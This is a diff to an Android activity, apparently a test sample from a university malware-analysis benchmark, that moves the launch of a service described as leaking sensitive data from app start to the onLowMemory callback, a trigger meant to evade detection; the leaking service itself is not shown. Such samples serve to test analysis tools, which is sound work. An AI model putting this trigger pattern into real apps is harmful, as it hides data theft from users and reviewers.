@@ -1,4 +1,4 @@
-package edu.ucdavis.time3;
+package edu.ucdavis.devstatus1;
 
 import android.content.Intent;
 import android.support.v7.app.AppCompatActivity;
@@ -8,10 +8,9 @@ import com.google.ssearch.SearchService;
 
 /**
  * Class: MainActivity
- * Description: Sensitive data is sent out when the period between now and last is larger than a
- * specific time, derived from DroidKunfu1
- * Authors：Hao Fu(haofu@ucdavis.edu)
- * Date: 6/30/2016 6:35 PM
+ * Description: Leak when onLowMemory
+ * Authors: Hao Fu(haofu@ucdavis.edu)
+ * Date: 7/1/2016 10:34 AM
  */
 public class MainActivity extends AppCompatActivity {
 
@@ -19,7 +18,10 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+    }
 
+    @Override
+    public void onLowMemory() {
         Intent in = new Intent();
         in.setClass(this, SearchService.class);
         startService(in);
